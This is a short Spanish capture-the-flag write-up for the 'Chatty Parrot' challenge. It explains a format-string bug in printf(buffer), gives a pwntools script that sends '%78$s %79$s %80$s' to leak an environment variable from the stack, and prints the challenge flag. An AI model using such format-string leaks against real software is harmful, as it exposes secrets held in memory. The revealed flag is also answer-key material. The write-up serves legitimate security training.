# Chatty Parrot

El programa exigia que existiese la variable de entorno `FLAG_VAL`, que en el servidor era el valor real de la bandera.

El programa tomaba la entrada, la almacenaba en un `buffer` y la imprimia en pantalla con `printf(buffer)`, claramente vulnerable a cadena formateada.

La pila almacena punteros a las variables de entorno en el fondo de la misma. Con el operador `%n80$s` podemos imprimir como una cadena C el valor apuntado por un puntero en la N-esima posicion de la pila. (A veces puede causar SIGSEV si se intenta leer un puntero nulo).

Alrededor de la posicion 79 con respecto al registro rsp al momento del `printf` se encuentra el puntero a `FLAG_VAL`:

```python
#!/usr/bin/env python3

from operator import add
from pwn import *
elf = ELF("./ChattyParrot")
#libc = ELF("./")
#ld = ELF("./")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"
gs = '''
break main
'''

domain= "ctf.mf.grsu.by"
port = 9077

def start():
    if args.REMOTE:
        return remote(domain, port)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path],env={"FLAG_VAL":"TEST-TEST-TEST"})
r = start()

#========= exploit here ===================

payload = b"%78$s %79$s %80$s"
r.sendlineafter(b"phrase:",payload)
leaks = r.recvline()
print(leaks)
# LEAKS
```

`grodno{J35KiI_P4RR07_Drug_M47u3}`
